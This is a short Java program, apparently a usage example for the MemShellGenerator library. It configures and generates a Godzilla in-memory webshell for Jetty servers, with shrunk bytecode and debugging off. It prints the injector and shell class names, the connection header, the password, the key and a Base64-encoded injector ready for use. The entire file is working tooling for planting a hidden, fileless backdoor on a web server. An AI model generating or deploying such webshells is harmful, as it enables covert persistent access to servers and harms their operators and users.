import com.reajason.javaweb.Server;
import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.GodzillaConfig;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.MemShellResult;

public class Test {
    public static void main(String[] args) {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.Jetty)
                .serverVersion("7+")
                .targetJreVersion(52)
                .shellTool(ShellTool.Godzilla)
                .shellType(ShellType.JAKARTA_HANDLER)
                .shrink(true) // 缩小字节码
                .debug(false) // 关闭调试
                .build();

        InjectorConfig injectorConfig = InjectorConfig.builder()
                .build();

        GodzillaConfig godzillaConfig = GodzillaConfig.builder()
                .build();

        MemShellResult result = MemShellGenerator.generate(shellConfig, injectorConfig, godzillaConfig);

        System.out.println("注入器类名：" + result.getInjectorClassName() + "(" + result.getInjectorSize() + ")");
        System.out.println("内存马类名：" + result.getShellClassName() + "(" + result.getShellSize() + ")");
        System.out.println("连接信息：\n" + "请求头：" + godzillaConfig.getHeaderName() + ": " + godzillaConfig.getHeaderValue());
        System.out.println("密码：" + godzillaConfig.getPass());
        System.out.println("密钥：" + godzillaConfig.getKey());

        System.out.println("Base64 注入器：" + result.getInjectorBytesBase64Str());
    }
}
